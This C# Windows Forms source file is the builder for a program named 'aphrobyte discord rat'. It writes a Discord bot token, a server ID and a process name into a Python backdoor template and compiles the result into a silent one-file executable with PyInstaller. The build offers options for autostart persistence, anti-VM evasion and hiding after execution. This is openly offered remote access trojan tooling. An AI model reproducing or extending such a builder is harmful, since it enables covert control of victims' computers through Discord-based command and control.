using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace aphrobyte_discord_rat
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        static void Compile(string guild_id, string bot_token, string alerts_id, string process_name, string backdoor_name, string backdoor_location, bool startup, bool antivm, bool hide)
        {
            if (Directory.Exists("dist"))
            {
                Directory.Delete("dist", true);
            }
            if (Directory.Exists("build"))
            {
                Directory.Delete("build", true);
            }
            if (Directory.Exists($"{backdoor_name}.spec"))
            {
                Directory.Delete($"{backdoor_name}.spec", true);
            }
            if (File.Exists(".buildmodules\\main.py"))
            {
                File.Delete(".buildmodules\\main.py");
            }

            if (!backdoor_name.EndsWith(".exe"))
            {
                backdoor_name = $"{backdoor_name}.exe";
            }

            string sample_path = ".buildmodules\\sample.py";
            File.Copy(sample_path, ".buildmodules\\main.py"); File.Move(".buildmodules\\main.py", ".buildmodules\\main.py");

            string unconfigured = File.ReadAllText(".buildmodules\\main.py");
            unconfigured = unconfigured.Replace("{guildid}", guild_id);
            unconfigured = unconfigured.Replace("{token}", bot_token);
            unconfigured = unconfigured.Replace("{announcements}", alerts_id);
            unconfigured = unconfigured.Replace("{processname}", process_name);
            unconfigured = unconfigured.Replace("{backdoorlocation}", backdoor_location);
            unconfigured = unconfigured.Replace("\"{autostart}\"", startup.ToString());
            unconfigured = unconfigured.Replace("\"{antivm}\"", antivm.ToString());
            unconfigured = unconfigured.Replace("\"{hideafterexec}\"", hide.ToString());

            File.WriteAllText(".buildmodules\\main.py", unconfigured);

            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "cmd.exe";
            ps.WindowStyle = ProcessWindowStyle.Normal;
            ps.Arguments = $"/c title \"Compiling configuration, please wait...\" && python -m PyInstaller --onefile --noconsole --name=\"{backdoor_name}\" .buildmodules\\main.py && title \"Backdoor compiled \" && move \"dist\\{backdoor_name}\" {backdoor_name} && echo . && pause";
            Process.Start(ps);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            bool filledtextbox_1 = !string.IsNullOrWhiteSpace(textBox1.Text);
            bool filledtextbox_2 = !string.IsNullOrWhiteSpace(textBox2.Text);
            bool filledtextbox_3 = !string.IsNullOrWhiteSpace(textBox3.Text);
            bool filledtextbox_4 = !string.IsNullOrWhiteSpace(textBox4.Text);
            bool filledtextbox_5 = !string.IsNullOrWhiteSpace(textBox5.Text);
            bool combobox_selected = comboBox1.SelectedIndex != -1;

            if (filledtextbox_1 && filledtextbox_2 && filledtextbox_3 && filledtextbox_4 && filledtextbox_5 && combobox_selected)
            {
                string guildid = textBox1.Text;
                string bottoken = textBox2.Text;
                string alertsid = textBox3.Text;
                string processname = textBox4.Text;
                string backdoorname = textBox5.Text;
                string backdoorlocation = comboBox1.Text;
                bool startup = checkBox1.Checked;
                bool antivm = checkBox2.Checked;
                bool hide = checkBox4.Checked;
                Compile(guildid, bottoken, alertsid, processname, backdoorname, backdoorlocation, startup, antivm, hide);
                if (Directory.Exists("dist"))
                {
                    Directory.Delete("dist", true);
                }
                if (Directory.Exists("build"))
                {
                    Directory.Delete("build", true);
                }
                if (File.Exists($"{backdoorname}.spec"))
                {
                    File.Delete($"{backdoorname}.spec");
                }
                if (File.Exists(".buildmodules\\main.py"))
                {
                    File.Delete(".buildmodules\\main.py");
                }

            } else
            {
                MessageBox.Show("Please complete every field and choose a backdoor location.", "Configuration incomplete", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (checkBox5.Checked != true)
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "cmd.exe";
                ps.WindowStyle = ProcessWindowStyle.Normal;
                ps.Arguments = "/c title \"Installing requirements, please wait...\" && pip install -r .buildmodules\\requirements.txt && title \"Requirements installed\" && echo . && pause";
                Process.Start(ps);
            }
            else
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "cmd.exe";
                ps.WindowStyle = ProcessWindowStyle.Normal;
                ps.Arguments = "/c title \"Installing and upgrading requirements, please wait...\" && pip install --upgrade pip && pip install --upgrade wheel && pip install --upgrade setuptools && pip install -U -r .buildmodules\\requirements.txt && title \"Requirements installed\" && echo . && pause";
                Process.Start(ps);
            }
        }
    }
}
